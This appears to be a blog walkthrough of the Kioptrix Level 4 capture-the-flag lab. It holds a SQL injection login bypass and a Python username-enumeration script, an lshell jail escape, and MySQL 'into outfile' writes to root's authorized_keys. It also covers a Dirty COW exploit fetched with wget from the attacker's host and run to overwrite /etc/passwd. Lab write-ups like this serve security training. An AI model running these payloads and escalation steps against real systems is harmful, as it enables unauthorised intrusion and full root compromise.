---
layout: post
title: Kioptrix Level 4 CTF Walkthrough
date: 2017-08-03
categories:
  - security
  - ctf
  - walkthrough
tags:
  - kioptrix
  - vulnhub
---
## Service Discovery
Running Nmap (`nmap -sS -sV -Pn -vv -T4 10.2.0.104`) revealed that SSH, Apache and Samba are all running on the host:

```
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp  open  http        syn-ack ttl 64 Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

As Nmap wasn't able to fingerprint the exact version of Samba, I proceeded to find the NetBIOS name of the machine and connect to it using `smbclient` to verify the version and list the shares:

```shell_session
root@kali:~# nmblookup -A 10.2.0.104
Looking up status of 10.2.0.104
	KIOPTRIX4       <00> -         B <ACTIVE>
	KIOPTRIX4       <03> -         B <ACTIVE>
	KIOPTRIX4       <20> -         B <ACTIVE>
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>
	WORKGROUP       <00> - <GROUP> B <ACTIVE>

	MAC Address = 00-00-00-00-00-00

root@kali:~# smbclient -L \\KIOPTRIX4 -I 10.2.0.104
Enter root's password:
Anonymous login successful
Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.28a]

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (Kioptrix4 server (Samba, Ubuntu))
Anonymous login successful
Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.28a]

	Server               Comment
	---------            -------
	KIOPTRIX4            Kioptrix4 server (Samba, Ubuntu)
```

With version 3.0.28a identified, I took a look at some of the vulnerabilities it is affected by, but seemingly nothing to use for initial access; so I moved on to the web server.

## Web Server and SQLi Enumeration
Checking out the web server presented me instantly with a login page; naturally, the first thing I tried is the usual SQLi test.

I submitted the form with `admin` as the username, and `'or'a'='a` as the password, which seemingly logged me in and showed me this message:

```
User admin

Oups, something went wrong with your member's page account.
Please contact your local Administrator
to fix the issue.
```

It seemed that the page was authenticating me, but then failing to load details of the user account due to `admin`, presumably, not existing.

As this SQL injection was able to confirm when a username is invalid, I put together a small Python script to automate using this injection in combination with a wordlist:

```python
import requests
import sys

with open(sys.argv[1], 'r') as f:
  for line in f:
    sys.stdout.write("Trying username: %s                                  \r" % line.strip())
    sys.stdout.flush()
    r = requests.post("http://10.2.0.104/checklogin.php", data={ 'myusername' : line.strip(), 'mypassword' : "'or'a'='a", 'Submit' : 'Login' }, allow_redirects=True)
    if r.text.find("Oups, something went wrong") == -1:
      print "++ Found user %s ++" % line.strip()
```

This script will iterate through a wordlist (passed to it as the first argument), use the current line as the username value when submitting the form with the SQLi payload as the password and then check if it can find the constant "Oups, something went wrong". If the constant isn't found, it will flag up that the username appears to be valid.

When running the script with a copy of the [names.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt) wordlist from the [SecLists](https://github.com/danielmiessler/SecLists) project, it confirmed the existence of two accounts:

```shell_session
root@kali:~/kioptrix4# python user_enum.py names.txt
++ Found user john ++                                             
++ Found user robert ++
```

Now that I had confirmed two valid usernames, I logged in to both accounts using the same SQL injection, and was presented with their passwords in plain text after logging in to each.

The plaintext password for `robert` was `ADGAdsafdfwt4gadfga==`, and the plaintext password for `john` was `MyNameIsJohn`.

## Escaping Jail
Logged in to the `robert` and `john` accounts both present a low level, jailed shell. The only available commands were `cd`, `clear`, `echo`, `exit`, `help`, `ll`, `lpath` and `ls`.

Attempting to echo an environment variable returned an error message which suggested `lshell` may be in use:

```shell_session
robert:~$ echo $SHELL
*** forbidden path -> "/bin/kshell"
```

If `lshell` is being used, and you have access to the `echo` command, it can be escaped by running `echo os.system('/bin/bash')`; which is what I did to gain full shell access.

## SSH Access as Root
Now that I had a full shell, I looked at the contents of `/var/www/checklogin.php` for some MySQL credentials and found that the web application is using the `root` account with a blank password:

```php
$host="localhost"; // Host name
$username="root"; // Mysql username
$password=""; // Mysql password
$db_name="members"; // Database name
$tbl_name="members"; // Table name

// Connect to server and select databse.
mysql_connect("$host", "$username", "$password")or die("cannot connect");
mysql_select_db("$db_name")or die("cannot select DB");
```

A look at the current process list also revealed that MySQL itself is running as `root`:

```shell_session
robert@Kioptrix4:/var/www$ ps aux | grep mysql
root      4024  0.0  0.1   1772   528 ?        S    15:03   0:00 /bin/sh /usr/bin/mysqld_safe
root      4066  0.0  5.1 127176 26520 ?        Sl   15:03   0:02 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root --pid-file=/var/run/mysqld/mysqld.pid --skip-
root      4068  0.0  0.1   1700   560 ?        S    15:03   0:00 logger -p daemon.err -t mysqld_safe -i -t mysqld
robert    4631  0.0  0.1   3004   752 pts/1    R+   16:39   0:00 grep mysql
```

If a MySQL user isn't setup with the appropriate permissions, it is possible to write the results of queries to a file, which can be used to write arbitrary files.

A quick test showed that the `root` user was able to output to files, and that the files were being written as the system `root` user too:

```shell_session
mysql> select 'test' into outfile '/tmp/test.txt';
Query OK, 1 row affected (0.00 sec)

***

robert@Kioptrix4:/var/www$ ls -l /tmp
total 4
-rw-rw-rw- 1 root root 5 2017-08-01 16:40 test.txt
robert@Kioptrix4:/var/www$ cat /tmp/test.txt
test
robert@Kioptrix4:/var/www$
```

With root file system access confirmed, I used the same query to write out a public key to `/root/.ssh/authorized_keys`:

```shell_session
mysql> select 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRlj18X0JWCla6TpLSbSI63UINfVuHUkLBrvTAUvbsTMi1oKb75dATm5JgMdutK4mDT2+2hbPYN9Ckwu0okkXWwwlHxjlp1SD6iGEbKp9VeVfG9Dt8gzRILslxP0BNvYqLzAd/URal7j6B4trinm6sDFFlvRh0kMrjy4ziBL8P74Ham/QjBnPzvtpLzu9mhlfda7OoIifb0S0SaJ9657Ii4Cv5AaVOyo4tYVaY6Tsaw7SF+3TZ9QvZ5f8LYwlHFA4xHAlWO929491VUaOlhObO2AdeqkhcOEfHtCIarByjCHo+atjM0Wj6PEo7HtU3P7bUVSHwoIjI7IjqofOo+bK1 rastating' into outfile '/root/.ssh/authorized_keys';
Query OK, 1 row affected (0.00 sec)
```

I then tried to SSH as `root` using the private key, but was presented with the password prompt instead; suggesting that OpenSSH is not configured to allow keys to be used; which could be confirmed by checking out `/etc/ssh/sshd_config`:

```
# Authentication:
LoginGraceTime 120
PermitRootLogin yes
StrictModes yes
```

## Rooting with Dirty Cow
As SSH was out of the question, I moved on to attacking the kernel. I grabbed a copy of [FireFart's](https://twitter.com/_firefart_) dirty cow exploit from Exploit-DB (https://www.exploit-db.com/exploits/40839/) and compiled it locally, due to `gcc` not being present on the target machine.

Once compiled, I started a local web server (`python -m SimpleHttpServer 5555`) to transfer the exploit across, but it timed out each time; which suggested there was some egress filtering in place.

A quick look at `/etc/iptables.rules` confirmed there were a number of restrictions on outgoing traffic, which would include port 5555, which I ran the HTTP server on:

```shell_session
robert@Kioptrix4:~$ cat /etc/iptables.rules  
# Generated by iptables-save v1.3.8 on Mon Feb  6 20:00:52 2012
*filter
:INPUT ACCEPT [6150:1120650]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [969:93214]
-A INPUT -p tcp -m tcp --dport 4444 -j DROP
-A INPUT -p tcp -m tcp --dport 1337:6000 -j DROP
-A INPUT -p tcp -m tcp --dport 10000:31337 -j DROP
-A INPUT -p tcp -m tcp --dport 8080 -j DROP
-A OUTPUT -p tcp -m tcp --dport 4444 -j DROP
-A OUTPUT -p tcp -m tcp --dport 1337:6000 -j DROP
-A OUTPUT -p tcp -m tcp --dport 10000:31337 -j DROP
-A OUTPUT -p tcp -m tcp --dport 8080 -j DROP
-A OUTPUT -p tcp -m tcp --dport 80 -j DROP
-A OUTPUT -p tcp -m tcp --dport 21 -j DROP
COMMIT
# Completed on Mon Feb  6 20:00:52 2012
```

With the above rules in mind, I restarted the HTTP server and bound to port 81 instead, which allowed me to transfer the exploit, run it, and temporarily overwrite the root user:

```shell_session
robert@Kioptrix4:~$ wget 10.2.0.3:81/dirtycow
--17:47:02--  http://10.2.0.3:81/dirtycow
           => `dirtycow'
Connecting to 10.2.0.3:81... connected.
HTTP request sent, awaiting response... 200 OK
Length: 12,768 (12K) [application/octet-stream]

100%[=======================================================================================================>] 12,768        --.--K/s             

17:47:02 (1.37 GB/s) - `dirtycow' saved [12768/12768]

robert@Kioptrix4:~$ chmod +x dirtycow
robert@Kioptrix4:~$ ./dirtycow
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password:
Complete line:
rastating:fioaKmuWSeBhQ:0:0:pwned:/root:/bin/bash

mmap: b7f6f000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'rastating' and the password 'toor'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'rastating' and the password 'toor'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
```

Now I was able to login as the new super user, restore the original `/etc/passwd` to restore the `root` user, switch to `root` and finally read the flag:

```shell_session
Welcome to LigGoat Security Systems - We are Watching
rastating@Kioptrix4:~# rm /etc/passwd
rastating@Kioptrix4:~# mv /tmp/passwd.bak /etc/passwd
rastating@Kioptrix4:~# su root
root@Kioptrix4:~# ls -l
total 8
-rw-r--r-- 1 root       root        625 2012-02-06 10:48 congrats.txt
drwxr-xr-x 8 loneferret loneferret 4096 2012-02-04 17:01 lshell-0.9.12
root@Kioptrix4:~# cat congrats.txt
Congratulations!
You've got root.

There is more then one way to get root on this system. Try and find them.
I've only tested two (2) methods, but it doesn't mean there aren't more.
As always there's an easy way, and a not so easy way to pop this box.
Look for other methods to get root privileges other than running an exploit.

It took a while to make this. For one it's not as easy as it may look, and
also work and family life are my priorities. Hobbies are low on my list.
Really hope you enjoyed this one.

If you haven't already, check out the other VMs available on:
www.kioptrix.com

Thanks for playing,
loneferret
```
